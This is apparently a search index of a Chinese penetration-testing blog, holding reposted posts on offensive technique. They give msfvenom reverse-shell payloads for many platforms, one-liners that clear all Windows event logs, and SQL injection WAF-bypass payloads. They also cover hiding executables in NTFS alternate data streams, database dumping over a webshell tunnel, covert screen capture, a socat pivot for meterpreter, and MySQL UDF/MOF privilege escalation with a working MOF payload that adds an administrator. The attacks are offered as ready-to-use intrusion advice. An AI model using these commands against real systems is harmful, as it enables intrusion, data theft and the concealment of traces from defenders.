<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[msfvenom 进阶]]></title>
    <url>%2Farchives%2F4cc0d230.html</url>
    <content type="text"><![CDATA[msfvenom 常规选项用途:-l 列出所有可用的payload,编码器,空指令…… -p 指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的 -f 指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式 -e 指定要使用那种编码器 -i 指定编码的次数,如果使用编码器 -b 指定坏字符,比如空字符截断问题,等等…… -x 使用一个自定义可执行程序模板,并将payload嵌入其中 -k 当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用 -o 指定创建好的payload的存放位置 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例 msf &gt; use exploit/multi/handler msf &gt; set payload windows/meterpreter/reverse_tcp msf &gt; set lport 443 msf &gt; set lhost 192.168.3.12 msf &gt; exploit -j 实例创建各类系统平台下的payload: windows 平台普通的exe 直接双击即可触发,会弹回一个常规meterpreter # msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -e x86/shikata_ga_nai -b &apos;\x00\x0a\xff&apos; -i 3 -f exe -o x86_shell.exepowershell把文件中编码后的powershell payload代码直接抠出来,丢到目标机器的cmd中去执行触发,会弹回一个powershell的shell # msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1linux 平台直接赋予执行权限,执行即可触发,关于如何将payload嵌入deb或者rpm包中,我们后续再单独说 # msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f elf -o x86_shellmac 平台# msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f macho -o x86_shell.machoandroid平台注意这里生成的apk是不能直接被装到手机上的,还需要你自己给apk签个名才能装,装完以后点击打开即可触发,关于如何向正常的app中嵌入msf的payload后期也会单独再说明 # msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f apk -o x86_shell.apk##各类web脚本 对于此类的web脚本触发执行方法非常简单,直接在url中访问该脚本即可 php 脚本# msfvenom --platform PHP -p php/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.phpaspx 脚本# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f aspx -o x86_shell.aspxjsp 脚本# msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.jspwar包找个能部署war包的地方,如各类java控制台,部署一下即可执行 # msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.war基于其它各类脚本的payload,说几个实战中可能会碰到的语言环境 nodejs# msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.jspython# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.py###perl # msfvenom -p cmd/unix/reverse_perl LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.plruby# msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.rblua# msfvenom -p cmd/unix/reverse_lua LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.lua利用wireshark观察不同协议下的payload的运作细节:bind类型windows/meterpreter/bind_tcp windows/meterpreter/bind_tcp_rc4 windows/meterpreter/bind_hidden_tcpreverse类型windows/meterpreter/reverse_tcp windows/meterpreter/reverse_tcp_dns windows/meterpreter/reverse_tcp_rc4 windows/meterpreter/reverse_tcp_rc4_dns windows/meterpreter/reverse_http windows/meterpreter/reverse_https32位windows/meterpreter/bind_tcp64位windows/x64/meterpreter/reverse_tcp生成不同平台下的shellcodewin平台shellcode# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f clinux平台shellcode# msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f cmac平台shellcode# msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f c 将普通类型的shell升级为meterpreter: post/multi/manage/shell_to_meterpreter 如做免杀看这篇文章: https://maikefee.com/archives/2c24cfb2.html]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>神兵利器</category>
        <category>Metesploit</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[win 的入侵日志简单处理(日志清理)]]></title>
    <url>%2Farchives%2F7ed32148.html</url>
    <content type="text"><![CDATA[前言 入侵日志处理作为后渗透环节的重要组成部分,可能很多朋友在实际渗透中,对它貌似都并不怎么上心[ 但这确实又很重要 ],利用win带的 wevtutil 日志管理工具[win 7以后自带,03之前的系统就不说了吧,大家都很熟悉了]可以很方便[‘不过,有点儿太方便了’]的帮我们处理一些敏感的系统安全类日志,既然要涉及到系统的安全审计,’管理员权限’ 自然是少不了的: # wevtutil el | more 查看系统日志列表项 # wevtutil cl &quot;windows powershell&quot; 清除powershell日志 # wevtutil cl &quot;security&quot; 清除系统安全日志 # wevtutil cl &quot;system&quot; 清除系统日志 # wevtutil cl &quot;application&quot; 清除应用程序日志 第一种利用常规for循环 一句话清除所有系统日志: for /F &quot;tokens=*&quot; %a in (&apos;wevtutil.exe el&apos;) DO wevtutil.exe cl &quot;%a&quot; 第二种如果你弹回来的是一个ps的shell,也可直接用ps来批量删日志: PS C:\&gt; wevtutil el | Foreach-Object {Write-Host &quot;Clearing $_&quot;; wevtutil cl &quot;$_&quot;} 清理完成 删完之后你会发现整个世界瞬间就安静了,是的,没错,直接整个全部清空,简单粗暴,尼玛……可能wevtutil里面还有一些可以筛选日志的选项是我暂时还没发现吧,后期看到了再陆续补充上来,实在不行就只能自己写脚本了[也许powershell会是个不错的选择] 总结 日志全删肯定不是一个好办法,但是是最稳的方法,日志全删容易被发现,这就不用多说了 最好的办法就是替换日志 文章来源: https://klionsec.github.io/2017/05/19/wevtutil/]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>日志清理</category>
        <category>Win日志清理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bypasswaf for mysql [数据库层面之特殊字符篇]]]></title>
    <url>%2Farchives%2F5c55d41e.html</url>
    <content type="text"><![CDATA[先准备好用于测试库表及数据:create database injection; use injection; CREATE TABLE IF NOT EXISTS `user`( `id` INT UNSIGNED AUTO_INCREMENT, `username` VARCHAR(30) NOT NULL, `password` VARCHAR(40) NOT NULL, `email` VARCHAR(40) NOT NULL, PRIMARY KEY ( `id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8; insert into user(username,password,email) values(&apos;gentoo&apos;,&apos;superman&apos;,&apos;sec@rootkit.org&apos;); insert into user(username,password,email) values(&apos;arch&apos;,&apos;welcome&apos;,&apos;lin@hook.org&apos;); insert into user(username,password,email) values(&apos;admin&apos;,&apos;loginpass&apos;,&apos;xlion@priv.org&apos;);测试表数据:mysql&gt; select * from user; +----+----------+-----------+-----------------+ | id | username | password | email | +----+----------+-----------+-----------------+ | 1 | gentoo | superman | sec@rootkit.org | | 2 | arch | welcome | lin@hook.org | | 3 | admin | loginpass | xlion@priv.org | +----+----------+-----------+-----------------+测试表结构:mysql&gt; desc user; +----------+------------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +----------+------------------+------+-----+---------+----------------+ | id | int(10) unsigned | NO | PRI | NULL | auto_increment | | username | varchar(30) | NO | | NULL | | | password | varchar(40) | NO | | NULL | | | email | varchar(40) | NO | | NULL | | +----------+------------------+------+-----+---------+----------------+mysql中的一些特殊字符利用:最常见的内联注释:mysql&gt; select username,password,email from user where id=-1 union/**/(select/*!*/!.1,(select/*!50000*/schema_name from information_schema.schemata limit 0,1),2) ; -- + +----------+--------------------+-------+ | username | password | email | +----------+--------------------+-------+ | 0 | information_schema | 2 | +----------+--------------------+-------+利用科学计数:mysql&gt; select username,password,email from user where id=-11e1union/**/select+null,null,null ;-- - +----------+----------+-------+ | username | password | email | +----------+----------+-------+ | NULL | NULL | NULL | +----------+----------+-------+利用加减号特性:mysql&gt; select username,password,email from user where id=-1 union/*!*/select+null,-null,/*!null*/ ;-- - +----------+----------+-------+ | username | password | email | +----------+----------+-------+ | NULL | NULL | NULL | +----------+----------+-------+ mysql&gt; select username,password,email from user where id=-1 union (select+1,+(select+schema_name/**/from/*!*/information_schema.schemata/**/limit 0,1),2); +----------+--------------------+-------+ | username | password | email | +----------+--------------------+-------+ | 1 | information_schema | 2 | +----------+--------------------+-------+利用反引号特性:mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select+1,+(select+`schema_name`/**/from/*!*/information_schema.schemata/**/limit 0,1),2); +----------+--------------------+-------+ | username | password | email | +----------+--------------------+-------+ | 1 | information_schema | 2 | +----------+--------------------+-------+利用破折号特性,适合用在盲注中:mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,(select(schema_name)/**/from/*!*/information_schema.schemata/**/limit 0,1),2); +----------------------+--------------------+-------+ | username | password | email | +----------------------+--------------------+-------+ | 18446744073709551614 | information_schema | 2 | +----------------------+--------------------+-------+利用 ! 特性:mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,!(select(schema_name)/**/from/*!*/information_schema.schemata/**/limit 0,1),2); +----------------------+----------+-------+ | username | password | email | +----------------------+----------+-------+ | 18446744073709551614 | 1 | 2 | +----------------------+----------+-------+利用 @ ``特性:mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,!(select(@`schema_name`)/**/from/*!*/information_schema.schemata/**/limit 0,1),2); +----------------------+----------+-------+ | username | password | email | +----------------------+----------+-------+ | 18446744073709551614 | NULL | 2 | +----------------------+----------+-------+利用 . 特性:mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/1,(select(@`schema_name`)/**/from/*!*/information_schema.schemata/**/limit 0,1),2); +----------+----------+-------+ | username | password | email | +----------+----------+-------+ | 1 | NULL | 2 | +----------+----------+-------+利用单双引号特性:mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/&apos;1&apos;,(select(&quot;schema_name&quot;)/**/from/*!*/information_schema.schemata/**/limit 0,1),2); +----------+-------------+-------+ | username | password | email | +----------+-------------+-------+ | 1 | schema_name | 2 | +----------+-------------+-------+利用各种括号特性,如,花括号[小括号,总括号]:mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/(1),(select(&quot;schema_name&quot;)/**/from/*!*/information_schema.schemata/**/limit 0,1),2); +----------+-------------+-------+ | username | password | email | +----------+-------------+-------+ | 1 | schema_name | 2 | +----------+-------------+-------+利用后向引用对付拦截 union+select+from:mysql&gt; select username,password,email from user where id=-1|@sel:=(select schema_name from information_schema.schemata limit 0,1)/*!50000union*//*!50000*//*!50000select*/ 1,@sel,2; +----------+--------------------+-------+ | username | password | email | +----------+--------------------+-------+ | 1 | information_schema | 2 | +----------+--------------------+-------+单独拦截select的情况:mysql&gt; select username,password,email from user where id=-11e12union/*!50000select distinctrow*/+version(),+database(),user(); +------------+-----------+----------------+ | username | password | email | +------------+-----------+----------------+ | 5.7.17-log | injection | root@localhost | +------------+-----------+----------------+拦截select 和 from 之间有特殊字符的情况,这种情况比较适合盲注:mysql&gt; select if((select 4,\N) &gt; (select 2,\N),30,20); +-----------------------------------------+ | if((select 4,\N) &gt; (select 2,\N),30,20) | +-----------------------------------------+ | 30 | +-----------------------------------------+ mysql&gt; select username,password,email from user where id=-1 union select if((select length(schema_name),\Nfrom information_schema.schemata limit 1) &gt; (select 1,\N),110,0),2,3; +----------+----------+-------+ | username | password | email | +----------+----------+-------+ | 110 | 2 | 3 | +----------+----------+-------+灵活配合利用各类空白符,注释符:注释符:-- -- - --+ /**/ /*!*/ /*!50000*/ ......空白符:09 0A 0B 0C 0D A0 20 ..... 一点小结: 说实话,指望单一的技巧其实是很难bypass掉现在的waf的,把前辈们的思路和技巧变着法的灵活配合起来,才有可能达到想要的效果,bypasswaf也确实是一个比较漫长的过程,因为需要你不断的去发掘各种新的一些偏门的可利用的数据库,前端脚本,http协议及各类web中间件的特性,当然啦,这次仅仅是基于各种数据库层面来说,来日方长,我们后面还会有大量的篇幅来说这个东西,今天只是先打个照面,混个脸熟… 文章来源: https://klionsec.github.io/2017/07/31/bypasswaf-on-database/]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>数据库特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件隐藏 之 NTFS 交换数据流]]></title>
    <url>%2Farchives%2F4289907f.html</url>
    <content type="text"><![CDATA[不要为了读文章而读文章，一定要带着问题来读文章，勤思考。 关于 NTFS 交换数据流 NTFS 交换数据流属于NTFS文件系统独有的特性,在NTFS文件系统下,每个文件都可以存在多个数据流也就是说,除了主文件流之外,还可以有很多非主文件流寄宿在主文件流中,内部使用资源派生来维持与文件相关的信息虽然,我们无法看到数据流文件,但是它却真实存在于系统中,更多更细致的解释,大家可自行参考百科或ntfs官方文档… 如何实际创建一个数据交换流文件,其实方法很简单,如下命令格式 “宿主文件:准备与宿主文件相关联的数据流文件” 演示环境win2008r2cn ip: 192.168.3.23 kali ip: 192.168.3.38 等会儿弹meterpreter用先准备好正常的文件echo &quot;alternate data streams test&quot; &gt;&gt; file.txt dir 开始尝试寄生文件 将bad.txt文件寄生在file.txt文件上,即file.txt是宿主,bad.txt才是真正的交换数据流文件,如果你是按照正常的文件名来访问的话,是看不到:bad.txt的,一定程度上也确实达到了我们要隐藏文件的效果 # echo &quot;hello klion&quot; &gt;&gt; file.txt:bad.txt 将spoof.txt文件寄生在stream目录上,即stream目录是宿主,spoof.txt是真正的交换数据流文件,对寄生文件的访问方式同上 # type file.txt &gt;&gt; stream:spoof.txt 将face.jpg文件寄生在file.txt文件上,当然,既是图片肯定要用画板才能打开,在win下,对于寄生文件的访问方式其实和我们正常文件访问方式没什么不同,是什么类型的文件,就用什么工具打开即可 # type smile.jpg &gt;&gt; file.txt:face.jpg # mspaint file.txt:face.jpg 在03以下系统上寄生可执行文件的执行方式,直接像下面这样即可运行 # type shell.exe &gt;&gt; file.txt:meterpreter.exe # start file.txt:meterpreter.exe /b 但在03以后的系统上寄生可执行文件的执行方式,除了上面的基本步骤之外,还多一步,需要先自己手工建立mklink好链接,之后才能正常访问,否则就会提示下面的错误,遗憾的是,链接文件在图形界面中是可见的,当然,这个链接也是有办法把它搞掉的,只是自己暂时还没成功,后续成功后会再更新上来 # type shell.exe &gt;&gt; file.txt:meterpreter.exe # start file.txt:meterpreter.exe # mklink &quot;d:\NTFS Stream\link.exe&quot; &quot;d:\NTFS Stream\file.txt:meterpreter.exe&quot; # start link.exe /b 如何查找这类寄生的文件,其实很简单,nirsoft已经为我们提供好了AlternateStreamView,如下,另外,此类的工具多如牛毛,此处就不一一说明了 小结: 有些朋友可能还会有疑问,这里非要用echo和type[功能有点儿类似各个语言中文件操作的二进制方式读写]吗,难道只能寄生在这些类型的文件上吗,当然不是,只不过直接用目标系统中的工具会更好一点,[脑袋快的朋友可能早想到了,是的,没错,我们用powershell一样也可以达到同样甚至更好的效果,这个就留给大家去自行发挥了],要寄生在的对象可以是任意类型的文件,最后,关于此种方式的具体用途,我只能说,看大家自己的实际需求,比如,我们经常可能会用批处理去搜集一些目标系统信息,通常会把所有命令结果都直接重定向到一个文件中,然后再下载回来慢慢看,但如果我们用正常的文件,很可能会被对方发现,此时最简单隐蔽的方式,便是把结果文件寄生在目标现有的系统文件上,同样,我们也可以用这种方式直接把马寄生在目标系统中一个现有的文件上,前提是你的马确认已经免杀好了,否则很可能会触发报警,技术点确实已经非常老了,但并不代表不可以用,这里也仅仅是留个备忘,方便有需要的朋友 文章来源: https://klionsec.github.io/2017/11/13/ntfs-streams/]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Win特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用 Navicat 自带的http隧道进行脱裤]]></title>
    <url>%2Farchives%2F164b01be.html</url>
    <content type="text"><![CDATA[前言: 不要为了读文章而读文章，一定要带着问题来读文章，勤思考。 基本环境说明:目标边界机器lnmp01的域名及内网ip: www.rootkit.org 192.168.32.167 目标内网中数据库[暂以mysql为例]服务器[win7]的内网ip: 192.168.32.168 很明显,lnmp01和win7在目标内网是可以互通的实际脱裤可能会面临的一些困境:想脱数据,但目标数据库不允许root用户外连,可能的原因多种多样,一般只grant到指定的ip才能连 目标站库分离[再正常不过],数据库在内网的某台机器上 即使没分离,当前的数据库用户又不允许外联,另外,由于当前数据库用户权限不够,也没法自己开启外联 即使是root,不知道什么乱七八糟的原因,没法grant允许root外连... 边界防火墙阻断外部ip对内部数据库端口[假设为3306]的访问等等.... 还在为脱裤烦恼吗,嘿嘿……navicat也许可以帮到你我们最终要实现的效果: 通过lnmp01这台机器,脱取内网win7机器上的所有数据0x04 大概思路,前提是你现在至少已经有了一个菜刀的webshell 可执行系统命令,且能正常上传文件的情况下: 在数据量非常少的情况下,可考虑直接用菜刀,大马或者针对各种数据库的脱裤脚本来脱,一两万还是勉强可行的 还有一种,就是你也可以通过拦截菜刀的发送的sql语句,借助py把里面的语句替换成你自己的,以此来实现导出数据,不过效率肯定不是太高.... 如果数据量非常多的情况下,传统的方法,还可能会利用端口转发,把目标本地或内网指定机器的数据库端口转发到自己vps上,然后在vps本地再用navicat来脱,至于转发工具就非常多了,如,ew,socat之流.... 还有一种,就是咱们今天要介绍到的,利用Navicat自身提供的http代理连接方式,说白点儿就是http隧道,其实也是个烂大街的招儿了,但相见恨晚,嘿嘿……具体操作,如下: 首先,上传对应数据库的代理脚本[目前我们看到,暂只支持postgresql,sqlite以及mysql],这里暂以mysql为例,即上传Navicat安装目录下的ntunnel_mysql.php脚本到目标网站的任意目录中 然后,在浏览器中尝试访问该脚本,从界面乍一看,还以为是个脱裤脚本,其实,那只是个连接测试,它只是为了测试你的代理能否连接成功,做了下简单的连接验证而已 此时,在本地打开Navicat配置http连接,这里的通道地址就写你上面访问的那个url,说白点儿就是个代理端,记得勾上使用base64编码,防止waf从中作祟,然后主机名写localhost,账号密码写lnmp01本地数据库用户的账号即可,因为要连接lnmp01本地的mysql 再来尝试连接目标内网中win7机器上的mysql,此时主机名ip就要写目标内网那台机器的ip了,数据库账号密码也要写那台机器上的数据库账号密码 最后,实际的连接效果如下,此时即可尽情的脱裤了,navicat的速度和稳定性还是非常值得信赖的,唯一的缺陷就是速度可能会稍慢,不过这已经足以轻松秒杀市面上所有的脱裤脚本了 一点拓展:从上面的选项卡中我们也可以清晰的看到,除了可使用http隧道,它还支持通过ssh隧道和ssl加密 的 方法来连接,不得不说,Navicat实在是写的太贴心了,原谅自己用了这么年,直到今天才领悟到它的精髓,哈哈……实在是尴尬转载来自: https://klionsec.github.io/2017/08/02/navicat-dump/]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
      <tags>
        <tag>脱裤技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用win自带的 PSR 实现免杀截屏]]></title>
    <url>%2Farchives%2F5a94dda.html</url>
    <content type="text"><![CDATA[PSR 即win自带的”问题步骤记录器”,也就是说它只会捕捉活动窗口,并不是我们想象的各种远控中的那种截屏功能,win + R 输入 “psr” 即可开启 当然,实际渗透中,肯定是不能让对方有任何察觉的,所以图形界面的不要,悄悄的干活,我们可以直接在管理员权限的cmdshell下搞,其实,你完全也可以在PS的shell下操作,至于这个shell怎么搞到,随你,注意,虽然是在命令行中,进程列表中还是会被发现,不过,如果你自己会hook,也是可以让它消失的 C:\&gt;psr /start /gui 0 /output &quot;d:\capturescreen.zip&quot; C:\&gt;psr /stop 实际在搞个人机时最好把记录到的文件保存到一些临时目录里,一般就不会出现什么权限问题 下面是记录的实际效果,mht格式,直接用IE打开就好了,还是那句话,它只会捕捉活动窗口,至于窗口里面的内容,并不能实时捕捉到 如何防止我们自己的PSR被别人利用,很简单,直接到组策略中把对应的选项关掉即可 一点小结: 当然,如果你觉得仅仅是这样用就错了,bat+定时任务,你会发现,真的绝逼好用,最重要的是无需关心免杀… 文章来源: https://klionsec.github.io/2017/07/24/PSR-screen/]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Win特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何利用Socat更方便地穿透目标内网]]></title>
    <url>%2Farchives%2F59ee7291.html</url>
    <content type="text"><![CDATA[环境说明:lnmp01 假设为目标DMZ段机器,等会儿会作为proxy端 假设其公网ip为 192.168.3.30 假设其内网ip为 192.168.32.167 win7 假设为目标内网机器 假设其内网ip为 192.168.32.144本地机器 假设本地内网ip为 192.168.3.15需要注意的一些前提条件 本地机器能ping通lnmp01,lnmp01和目标内网中的win7能互通 最终目的,实现双内网通信,即在我自己的内网中操作目标内网中的机器,当然,实现双内网通信的方式还有非常多,比如常用的几种方法: 最传统的是通过在vps利用lcx listen做转发,然后再在本地bind上去另外,还是通过vps搭建vpn,本地先连到vpn内网中,再在vps上用lcx tran通过vpn内网转发到本地还有,利用meterpreter自带的端口转发功能,当然啦,那个是通过meterpreter隧道自己来实现的,也就是说你要先把meterpreter的shell先弹回来,因为这个并非今天重点,暂不多做介绍,有兴趣可自行深度挖掘研究再有,在一些高级点的马中也自带了各种内网代理功能….最后,就是接下来咱们要详细说明的这种,利用socat和目标DMZ建立双向通道,然后带出目标内网中所有机器的流量…… 大概实现思路: DMZ机器作为代理 -&gt; 将马的流量全部转到DMZ机器的指定端口上 -&gt; 再在本地与代理端转出的端口建立双向通道 -&gt; 本地只需要监听转过来的马的流量 -&gt; 成功上线 先在 lnmp01 安装好socat,实战中推荐用编译安装,走的时候直接一并把整个安装目录干掉,干净: yum install socat -y 本地准备好reverse的 payload,注意,这里的反连ip,要写目标边界DMZ的那台机器[即lnmp01]的ip: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=443 -f exe -o /root/shell.exe 本地开始执行监听: msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set lhost 192.168.3.15 msf exploit(handler) &gt; set lport 443 msf exploit(handler) &gt; exploit -j 在 lnmp01 上执行代理操作,意思比较简单,就是将本地的53和443端口进行绑定,相当于在本机建立一条管道,其实本机就是个中介,当有人访问本机的53端口,它就会把数据自动丢到本机的443端口上去,而443正好是我马的端口,这样,自然就造成了上线的效果: nohup socat tcp-listen:53 tcp-listen:443 此时,再回到本地和proxy端建立双向通道,最好在后台一直挂着,意思就是将本地的443端口和proxy端的53端口进行绑定,这样,当你访问本地的443其实就相当于访问proxy端的53端口,而proxy端的端口又和它本地的443端口进行了绑定,所以当马的443端口流量弹回来的时候就相当于直接弹到我本地: nohup socat tcp:192.168.3.30:53 tcp:192.168.3.15:443 最后在内网机器上执行payload,马成功上线 关于socat: 一款linux自带的高级端口转发工具,支持n多协议,基本上可以秒掉现在市面上已知的各类端口转发工具当然,它绝非仅仅端口转发这么点功用,比如,建立各种隧道等等…因为并非今天重点,这里不做过多说明,后续有空会详细说明 优点:不再需要在vps上做转发 只需要一台边界机器即可让内网所有机器上线 稳定,socat属于系统自带工具,使用简单方便,较适合内网渗透 ....缺点:防火墙阻断对指定端口的访问,说实话,如果你已经拿到目标机器权限,用iptables开两个端口还是比较容易的,就怕其他的一些乱七八糟的防护 如果实在端口出不来,就只能通过各种复用,或者利用更底层的协议隧道来搞,如,icmp,udp隧道...]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>内网通道</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win_MySQL数据库提权之UDF和MOF提权原理及实现]]></title>
    <url>%2Farchives%2F9ccf323f.html</url>
    <content type="text"><![CDATA[前言: 不要为了读文章而读文章，一定要带着问题来读文章，勤思考。 很多年前的文章了,整理和分享做个记录写在博客. UDF提权 关于UDF提权，也是现在比较常见的MySQL类提权方式之一。它的提权原理也非常简单！即是利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库！这样一来我们就可以利用 system权限进行提权操作了！ 在开始进行UDF提权前，我们有必要先了解下提权对象的系统版本及MySQL数据库的版本信息。因为对于不同的版本，操作手法也不近相同！ 自动提权udf(sqlmap):python sqlmap.py -d &quot;mysql://root:root@127.0.0.1:3306/mysql&quot;报错[CRITICAL] sqlmap requires &apos;python-pymysql&apos; third-party library in order to directly connect to the DBMS &apos;MySQL&apos;. You can download it from &apos;https://github.com/petehunt/PyMySQL/&apos;. Alternative is to use a package &apos;python-sqlalchemy&apos; with support for dialect &apos;mysql&apos; installed 是我没有安装Python连接Mysql用的第三方库python-pymysql 解决方法:git clone https://github.com/petehunt/PyMySQL/ cd PyMySQL/ sudo python setup.py install最后安装好python-pymysql后再执行命令： python sqlmap.py -d &quot;mysql://root:root@127.0.0.1:3306/mysql&quot; 手工提权 步骤: 1.看路径、版本 2.写dll到mysql文件夹里面 3.创建函数 4.执行命令提权 用到的命令:select @@datadir 查看路径 select @@version 查看版本windows下udf提权的条件&lt; 数据库版本为 5.0： 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导出到 C:\Winnt\udf.dll 下。 如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。&gt; 数据库版本为 5.1：我们则需要将 dll 文件导出到 mysql 安装目录的 lib\plugin\ 下， 才能创建自定义函数。注：如果没有 plugin 目录，我们可以进行手动创建！ 一般Lib、Plugin文件夹需要手工建立（可用流模式突破进而创建文件夹） 使用NTFS ADS流创建lib、plugin文件夹：某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在，怎么办？利用NTFS ADS流来创建文件夹的方法 select @@basedir; //查找mysql的目录 select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;; //使用NTFS ADS流创建lib目录,It is dll 以 hex 方式写入 select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;; //利用NTFS ADS再次创建plugin目录 执行成功以后再进行导出即可。 dll的写入:1. select &quot;hex()&quot; //16进制写入 2. webshell方式导入udf.dll 来源(此dll用在webshell上传用):sqlmap 目录有udf.dll(异或过,需解码): /sqlmap/data/udf/mysql/windows/(dll路径)sqlmap解码工具: /sqlmap/extra/cloak/cloak.py 用法: python cloak.py -d -i /sqlmap/data/udf/mysql/windows/xx.dll(解码后会在当前路径生成) 直接执行1. create function cmdshell returns string soname &apos;xx.dll&apos;; 创建 cmdshell 调用函数(变成了system权限) 2. select cmdshell(&apos;net user admin admin /add&apos;); 添加用户 3. select cmdshell(&apos;net localgroup administrators admin /add&apos;); 将用户加到管理组擦除痕迹：drop function sys_eval;常用函数名：cmdshell 执行cmd; downloader 下载者,到网上下载指定文件并保存到指定目录; open3389 通用开3389终端服务,可指定端口(不改端口无需重启); backshell 反弹Shell; ProcessView 枚举系统进程; KillProcess 终止指定进程; regread 读注册表; regwrite 写注册表; shut 关机,注销,重启; about 说明与帮助函数;报错udf导出失败The MySQL server is running with the --secure-file-priv option so it cannot execute this statement解决方法:在my.ini文件内加入secure_file_priv = &apos;/&apos;MFO提权mof提权的原理: mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。 mof提权的过程: 上传mof到可写目录 移动mof到c:/windows/system32/wbem/mof/nullevt.mof替换系统的mof文件 自动提权成功 上传mof到可写目录找一个可写目录上传mof文件，我这里上传到了 C:/wmpub/nullevt.mof 代码如下 #pragma namespace(&quot;\\\\.\\root\\subscription&quot;) instance of __EventFilter as $EventFilter { EventNamespace = &quot;Root\\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; }; instance of ActiveScriptEventConsumer as $Consumer { Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; };执行load_file及into dumpfile把文件导出到正确的位置select load_file(&apos;C:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;执行成功，查看用户(net user)]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>外网渗透</category>
        <category>提权(WEB)</category>
        <category>数据库提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
